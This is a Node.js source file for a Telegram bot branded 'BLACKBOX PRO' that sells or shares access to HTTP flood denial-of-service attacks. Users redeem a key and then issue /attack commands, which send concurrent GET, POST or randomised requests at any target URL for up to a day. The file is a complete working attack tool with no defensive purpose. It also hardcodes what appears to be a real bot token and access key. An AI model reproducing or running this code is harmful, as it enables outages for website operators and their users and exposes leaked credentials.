const express = require('express');
const TelegramBot = require('telegram-bot-vercel');
const http = require('http');

const app = express();

// ==== CONFIG ====
const CONFIG = {
  token: '8202346696:AAG2I28nxL0qGatWEre6IJL_y63yXXeuJMc',
  owner: 6629230649,
  key: '123RJhTtApALhaT'
};

// ==== OPTIMIZED BOT SETUP ====
const bot = new TelegramBot(CONFIG.token, { 
  polling: {
    interval: 100, // Faster polling
    timeout: 10,
    autoStart: true,
    params: {
      timeout: 10
    }
  },
  request: {
    timeout: 10000,
    agentOptions: {
      keepAlive: true,
      family: 4 // Force IPv4
    }
  }
});

const users = new Set([CONFIG.owner]);
const attacks = new Map();

// ==== SIMPLE HTTP FLOOD (NO AXIOS) ====
function startMultiAttack(target, duration, chatId, attackId, method = 'MIX') {
  let requests = 0;
  const startTime = Date.now();
  const endTime = startTime + (duration * 1000);
  
  const workers = [];
  const concurrentRequests = 20; // Reduce for stability
  
  // Simple HTTP request function
  function makeRequest(url, options = {}) {
    return new Promise((resolve) => {
      const req = http.request(url, { 
        method: options.method || 'GET',
        timeout: 2000 
      }, (res) => {
        res.on('data', () => {});
        res.on('end', resolve);
      });
      
      req.on('error', resolve); // Ignore errors
      req.on('timeout', () => {
        req.destroy();
        resolve();
      });
      
      if (options.method === 'POST') {
        req.write(JSON.stringify({ flood: Date.now() }));
      }
      
      req.end();
    });
  }
  
  // Create workers
  for (let i = 0; i < concurrentRequests; i++) {
    const worker = setInterval(async () => {
      if (Date.now() > endTime) {
        clearInterval(worker);
        return;
      }
      
      try {
        // Send requests based on method
        switch(method) {
          case 'HTTP':
            await makeRequest(target, { method: 'GET' });
            break;
          case 'POST':
            await makeRequest(target, { method: 'POST' });
            break;
          case 'MIX':
            await Promise.race([
              makeRequest(target, { method: 'GET' }),
              makeRequest(target, { method: 'POST' })
            ]);
            break;
          case 'RANDOM':
            const methods = ['GET', 'POST', 'HEAD'];
            const randomMethod = methods[Math.floor(Math.random() * methods.length)];
            await makeRequest(target, { method: randomMethod });
            break;
        }
        requests++;
      } catch {
        // Silent fail
      }
    }, 50); // 50ms interval
    
    workers.push(worker);
  }
  
  attacks.set(attackId, {
    workers,
    chatId,
    startTime,
    target,
    method,
    requestCount: 0
  });
  
  // Update request count
  const requestCounter = setInterval(() => {
    const attack = attacks.get(attackId);
    if (attack) attack.requestCount = requests;
  }, 1000);
  
  // Auto stop timer
  setTimeout(() => {
    const attack = attacks.get(attackId);
    if (attack) {
      attack.workers.forEach(worker => clearInterval(worker));
      clearInterval(requestCounter);
      attacks.delete(attackId);
      const totalTime = (Date.now() - attack.startTime) / 1000;
      
      if (bot && attack.chatId) {
        bot.sendMessage(attack.chatId,
          `✅ ATTACK FINISHED\n` +
          `ID: ${attackId}\n` +
          `Target: ${attack.target}\n` +
          `Duration: ${totalTime.toFixed(1)}s\n` +
          `Requests: ${requests}`
        ).catch(() => {});
      }
    }
  }, duration * 1000);
}

// ==== INSTANT COMMAND HANDLERS ====
bot.on('message', (msg) => {
  console.log(`[${new Date().toLocaleTimeString()}] Message from ${msg.from.id}: ${msg.text}`);
});

bot.onText(/\/start/, async (msg) => {
  const id = msg.from.id;
  const isOwner = id === CONFIG.owner;
  const isUser = users.has(id);
  
  let text = `⚡ BLACKBOX PRO\n👤 User ID: ${id}\n\n`;
  
  if (isOwner) {
    text += `👑 OWNER PRIVILEGES\n`;
    text += `✅ /attack url seconds method\n`;
    text += `🛑 /stop id\n`;
    text += `📋 /list\n`;
    text += `👥 /users\n`;
    text += `➕ /add id\n`;
    text += `📢 /broadcast text\n`;
  } else if (isUser) {
    text += `✅ AUTHORIZED USER\n`;
    text += `✅ /attack url seconds\n`;
    text += `🛑 /stop id\n`;
    text += `📖 /methods\n`;
  } else {
    text += `🔒 UNAUTHORIZED\n`;
    text += `Use: /key ${CONFIG.key}\n`;
  }
  
  try {
    await bot.sendMessage(msg.chat.id, text, { parse_mode: 'HTML' });
  } catch (e) {
    console.log('Send error:', e.message);
  }
});

bot.onText(/\/ping/, async (msg) => {
  const start = Date.now();
  await bot.sendMessage(msg.chat.id, '🏓 PONG');
  const latency = Date.now() - start;
  await bot.sendMessage(msg.chat.id, `⏱️ Response: ${latency}ms`);
});

bot.onText(/\/key (.+)/, async (msg, match) => {
  const id = msg.from.id;
  
  if (id === CONFIG.owner) {
    await bot.sendMessage(msg.chat.id, '👑 Owner tidak perlu key');
    return;
  }
  
  if (match[1] === CONFIG.key) {
    users.add(id);
    await bot.sendMessage(msg.chat.id, `✅ AKTIF!\nID: ${id}\nSekarang bisa pakai /attack`);
  } else {
    await bot.sendMessage(msg.chat.id, '❌ KEY SALAH');
  }
});

bot.onText(/\/attack (.+?) (\d+)(?: (.+))?/, async (msg, match) => {
  const id = msg.from.id;
  
  if (!users.has(id) && id !== CONFIG.owner) {
    await bot.sendMessage(msg.chat.id, '❌ Belum register\n/key 123RJhTtApALhaT');
    return;
  }
  
  const url = match[1].trim();
  const seconds = parseInt(match[2]);
  const method = (match[3] || 'MIX').toUpperCase();
  
  const validMethods = ['HTTP', 'POST', 'MIX', 'RANDOM'];
  if (!validMethods.includes(method)) {
    await bot.sendMessage(msg.chat.id, `❌ Method invalid\nGunakan: ${validMethods.join(', ')}`);
    return;
  }
  
  if (seconds < 1 || seconds > 86400) {
    await bot.sendMessage(msg.chat.id, '❌ Durasi 1-86400 detik');
    return;
  }
  
  const attackId = Math.random().toString(36).substring(2, 8).toUpperCase();
  
  await bot.sendMessage(msg.chat.id,
    `🚀 ATTACK LAUNCHED\n\n` +
    `ID: <code>${attackId}</code>\n` +
    `Target: ${url}\n` +
    `Method: ${method}\n` +
    `Duration: ${seconds}s\n\n` +
    `Stop: /stop ${attackId}`,
    { parse_mode: 'HTML' }
  );
  
  startMultiAttack(url, seconds, msg.chat.id, attackId, method);
});

bot.onText(/\/stop (.+)/, async (msg, match) => {
  const attackId = match[1].toUpperCase();
  const attack = attacks.get(attackId);
  
  if (!attack) {
    await bot.sendMessage(msg.chat.id, '❌ Attack ID tidak ditemukan');
    return;
  }
  
  const userId = msg.from.id;
  if (attack.chatId !== msg.chat.id && userId !== CONFIG.owner) {
    await bot.sendMessage(msg.chat.id, '❌ Hanya owner/pembuat attack');
    return;
  }
  
  attack.workers.forEach(worker => clearInterval(worker));
  attacks.delete(attackId);
  
  const duration = (Date.now() - attack.startTime) / 1000;
  await bot.sendMessage(msg.chat.id,
    `🛑 ATTACK STOPPED\n` +
    `ID: ${attackId}\n` +
    `Duration: ${duration.toFixed(1)}s\n` +
    `Target: ${attack.target}`
  );
});

bot.onText(/\/list/, async (msg) => {
  if (msg.from.id !== CONFIG.owner) return;
  
  if (attacks.size === 0) {
    await bot.sendMessage(msg.chat.id, '📭 No active attacks');
    return;
  }
  
  let text = `📋 ACTIVE ATTACKS (${attacks.size})\n\n`;
  
  attacks.forEach((attack, id) => {
    const duration = ((Date.now() - attack.startTime) / 1000).toFixed(0);
    text += `ID: ${id}\n`;
    text += `Target: ${attack.target}\n`;
    text += `Method: ${attack.method}\n`;
    text += `Duration: ${duration}s\n`;
    text += `User: ${attack.chatId}\n\n`;
  });
  
  await bot.sendMessage(msg.chat.id, text);
});

bot.onText(/\/methods/, async (msg) => {
  const methods = [
    'HTTP - GET requests only',
    'POST - POST data flood',
    'MIX - GET + POST mixed',
    'RANDOM - Random methods'
  ];
  
  await bot.sendMessage(msg.chat.id,
    `⚡ ATTACK METHODS:\n\n${methods.join('\n')}\n\n` +
    `Example:\n` +
    `/attack https://site.com 60 MIX\n` +
    `/attack https://site.com 120 POST`
  );
});

// ==== KEEP ALIVE FOR VERCEL ====
app.get('/', (req, res) => {
  res.send(`
    <!DOCTYPE html>
    <html>
    <head>
      <title>BLACKBOX PRO</title>
      <style>
        body { background: #000; color: #0f0; font-family: monospace; padding: 20px; }
        .container { max-width: 800px; margin: 0 auto; }
        h1 { color: #0f0; border-bottom: 2px solid #0f0; padding-bottom: 10px; }
        .stats { display: grid; grid-template-columns: repeat(2, 1fr); gap: 15px; margin: 20px 0; }
        .stat { background: rgba(0,255,0,0.1); padding: 15px; border: 1px solid #0f0; border-radius: 5px; }
        .stat .label { color: #0f0; opacity: 0.8; font-size: 14px; }
        .stat .value { color: #0f0; font-size: 24px; font-weight: bold; }
        .blink { animation: blink 1s infinite; }
        @keyframes blink { 0%,100% { opacity:1; } 50% { opacity:0.5; } }
      </style>
      <script>
        // Auto refresh every 30 seconds
        setTimeout(() => location.reload(), 30000);
      </script>
    </head>
    <body>
      <div class="container">
        <h1>⚡ BLACKBOX PRO <span class="blink">●</span></h1>
        
        <div class="stats">
          <div class="stat">
            <div class="label">STATUS</div>
            <div class="value">ACTIVE</div>
          </div>
          <div class="stat">
            <div class="label">USERS</div>
            <div class="value">${users.size}</div>
          </div>
          <div class="stat">
            <div class="label">ATTACKS</div>
            <div class="value">${attacks.size}</div>
          </div>
          <div class="stat">
            <div class="label">OWNER</div>
            <div class="value">${CONFIG.owner}</div>
          </div>
        </div>
        
        <div style="margin-top: 30px; color: #8f8;">
          Bot: ONLINE<br>
          Response: INSTANT<br>
          Key: ${CONFIG.key}<br>
          Uptime: ${Math.floor(process.uptime() / 60)} minutes
        </div>
      </div>
    </body>
    </html>
  `);
});

app.get('/health', (req, res) => {
  res.json({
    status: 'ok',
    bot: bot.isPolling() ? 'polling' : 'stopped',
    users: users.size,
    attacks: attacks.size,
    uptime: process.uptime()
  });
});

// ==== START SERVER ====
const PORT = process.env.PORT || 3000;
const server = app.listen(PORT, () => {
  console.log(`⚡ BLACKBOX PRO on port ${PORT}`);
  console.log(`👑 Owner: ${CONFIG.owner}`);
  console.log(`🔑 Key: ${CONFIG.key}`);
  
  // Test bot connection
  bot.getMe()
    .then(me => console.log(`✅ Bot: @${me.username}`))
    .catch(err => console.log('❌ Bot error:', err.message));
});

// ==== AUTO RESTART POLLING ====
setInterval(() => {
  if (!bot.isPolling()) {
    console.log('🔄 Restarting bot polling...');
    bot.startPolling().catch(() => {});
  }
}, 15000);

// ==== KEEP VERCEL AWAKE ====
if (process.env.VERCEL) {
  setInterval(() => {
    http.get(`http://localhost:${PORT}/health`, () => {}).on('error', () => {});
  }, 30000); // Ping sendiri setiap 30 detik
}

// ==== CLEANUP ====
process.on('SIGTERM', () => {
  console.log('Shutting down...');
  attacks.forEach(attack => {
    attack.workers.forEach(worker => clearInterval(worker));
  });
  bot.stopPolling();
  server.close();
  process.exit(0);
});
